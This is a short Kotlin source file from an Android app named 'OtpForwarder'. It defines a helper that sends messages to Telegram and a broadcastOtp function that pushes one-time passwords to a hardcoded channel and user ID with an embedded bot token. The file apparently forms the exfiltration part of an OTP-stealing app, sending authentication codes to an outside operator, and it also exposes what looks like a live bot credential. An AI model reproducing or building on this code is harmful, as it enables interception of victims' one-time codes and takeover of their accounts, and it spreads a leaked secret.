package com.example.otpforwarder

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

object TelegramHelper {
    private const val TAG = "OtpForwarder"
    const val DEFAULT_BOT_TOKEN = "8680515171:AAFAV9QowNvEJxl42mcFtMUhXhN6BuqPVSk"
    const val DEFAULT_CHANNEL_ID = "-1004470768686"
    const val DEFAULT_USER_ID = "291058055"

    suspend fun sendMessage(botToken: String, chatId: String, message: String): Pair<Boolean, String> {
        return withContext(Dispatchers.IO) {
            try {
                val encodedMsg = URLEncoder.encode(message, "UTF-8")
                val urlString = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encodedMsg"
                val url = URL(urlString)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.setRequestProperty("User-Agent", "OtpForwarder/1.0")
                connection.connectTimeout = 10000
                connection.readTimeout = 10000

                val code = connection.responseCode
                Log.d(TAG, "Telegram response code: $code for chatId: $chatId")
                if (code == 200) {
                    Pair(true, "Sent successfully")
                } else {
                    val errorStream = connection.errorStream?.bufferedReader()?.use { it.readText() } ?: "HTTP $code"
                    Log.e(TAG, "Telegram error: $errorStream")
                    Pair(false, "Error: $errorStream")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Exception sending Telegram message", e)
                Pair(false, e.localizedMessage ?: "Network error")
            }
        }
    }

    suspend fun broadcastOtp(botToken: String, message: String) {
        // Send to both the Channel and the direct User Chat so it never fails!
        sendMessage(botToken, DEFAULT_CHANNEL_ID, message)
        sendMessage(botToken, DEFAULT_USER_ID, message)
    }
}
